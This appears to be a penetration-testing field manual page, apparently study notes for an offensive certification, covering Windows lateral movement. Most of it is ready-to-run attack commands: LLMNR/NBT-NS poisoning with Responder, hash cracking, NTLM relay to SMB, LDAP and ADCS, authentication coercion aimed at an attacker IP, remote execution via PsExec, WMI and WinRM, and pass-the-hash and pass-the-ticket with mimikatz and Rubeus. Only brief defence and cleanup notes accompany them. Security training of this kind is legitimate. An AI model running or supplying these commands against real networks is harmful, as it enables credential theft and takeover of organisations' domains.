---
title: "Windows Lateral Movement"
description: "LLMNR/NBT-NS poisoning, NTLM relay, PsExec, WMI, WinRM, pass-the-hash, and pass-the-ticket."
category: "Field Manual"
tags: ["field-manual", "cpts", "windows", "lateral-movement", "ntlm"]
date: 2026-11-11
published: true
status: archive
---

# Windows Lateral Movement

## LLMNR / NBT-NS poisoning

Windows resolves names via LLMNR/NBT-NS when DNS fails. Responder answers and captures Net-NTLMv2 hashes.

```bash
responder -I tun0 -wv
responder -I tun0 -A          # analyse only
```

Then:

```bash
hashcat -m 5600 responder_hashes.txt rockyou.txt
```

Relay instead of cracking:

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -t ldap://$DC_IP -smb2support --delegate-access
```

Defences: disable LLMNR/NBT-NS, require SMB signing, enable EPA, segment networks.

## NTLM relay

Requirements:

- A host that authenticates to you (coercion or poisoning).
- A target that accepts NTLM and does not require signing/EPA.
- SMB signing disabled or LDAP signing not required (for LDAP relay).

```bash
# Relay SMB auth to SMB
impacket-ntlmrelayx -tf relay-targets.txt -smb2support

# Relay to LDAP for RBCD
impacket-ntlmrelayx -t ldap://$DC_IP -smb2support --delegate-access

# Relay to ADCS web enrollment (ESC8)
impacket-ntlmrelayx -t http://$CA/certsrv/ -smb2support
```

Coerce authentication:

```bash
impacket-printerbug "$DOMAIN/$USER:$PASS@$TARGET" $ATTACKER_IP
python3 PetitPotam.py $ATTACKER_IP $TARGET
```

`--delegate-access` creates a machine account and grants it RBCD over the relayed computer. Use `getST` afterwards.

## PsExec family

```bash
impacket-psexec "$DOMAIN/$USER:$PASS@$IP"
impacket-psexec -hashes :$NTHASH "$DOMAIN/Administrator@$IP"
impacket-smbexec "$DOMAIN/$USER:$PASS@$IP"
impacket-wmiexec "$DOMAIN/$USER:$PASS@$IP"
impacket-atexec "$DOMAIN/$USER:$PASS@$IP" 'whoami'
```

| Tool | Mechanism | Noise |
|---|---|---|
| `psexec` | Service creation + executable | High |
| `smbexec` | Service + cmd | Medium |
| `wmiexec` | WMI process creation | Medium |
| `atexec` | Scheduled task | Medium |
| `nxc smb -x` | SMB exec wrapper | Medium |

NetExec:

```bash
nxc smb $IP -u "$USER" -p "$PASS" -x "whoami"
nxc smb $IP -u "$USER" -p "$PASS" -X "Get-Process"
```

## WMI and WinRM

```bash
impacket-wmiexec "$DOMAIN/$USER:$PASS@$IP"
nxc winrm $IP -u "$USER" -p "$PASS" -x "whoami"
evil-winrm -i $IP -u "$USER" -p "$PASS"
```

```powershell
Invoke-Command -ComputerName $IP -ScriptBlock { whoami } -Credential $cred
Enter-PSSession -ComputerName $IP -Credential $cred
```

WMI has no service creation but may be logged. WinRM requires the user to be in `Remote Management Users` or local admins.

## Pass-the-hash

```bash
nxc smb $IP -u Administrator -H $NTHASH
nxc winrm $IP -u Administrator -H $NTHASH
impacket-psexec -hashes :$NTHASH "$DOMAIN/Administrator@$IP"
xfreerdp /v:$IP /u:Administrator /pth:$NTHASH /cert:ignore
```

Test local vs domain accounts:

```bash
nxc smb $IP -u Administrator -H $NTHASH --local-auth
```

## Pass-the-ticket

Windows:

```text
mimikatz # kerberos::ptt ticket.kirbi
Rubeus.exe ptt /ticket:<base64>
```

Linux:

```bash
export KRB5CCNAME=/tmp/krb5cc_1000
klist
impacket-smbclient -k -no-pass dc01.target.htb
```

Overpass-the-hash (request a TGT from an NT hash):

```bash
impacket-getTGT "$DOMAIN/$USER" -hashes :$NTHASH -dc-ip $DC_IP
export KRB5CCNAME=$USER.ccache
```

```powershell
Rubeus.exe asktgt /user:$USER /rc4:$NTHASH /ptt
```

## SMB relay targets

Find hosts without signing:

```bash
nxc smb 10.10.10.0/24 -u "$USER" -p "$PASS" --gen-relay-list relay.txt
```

Relay to LDAP for RBCD, or to SMB for command execution. SMB relay to a DC is blocked when signing is required.

## AD lateral patterns

- DCSync from a compromised account with replication rights.
- Golden ticket for persistence after `krbtgt` compromise.
- SID history across trusts.
- AdminSDHolder/ACL persistence.
- Exchange/ADCS/SharePoint service accounts with broad rights.

## Cleanup

- Remove services (`sc delete`), scheduled tasks, and uploaded binaries.
- Delete machine accounts created for RBCD.
- Revert ACL changes.
- Close sessions and remove tickets from your host.
- Record every host and command.

## References

- [HackTricks — Lateral movement](https://book.hacktricks.wiki/en/windows-hardening/lateral-movement/index.html)
- [Impacket](https://github.com/fortra/impacket)
- [NetExec wiki](https://www.netexec.wiki/)
- [Responder](https://github.com/lgandx/Responder)
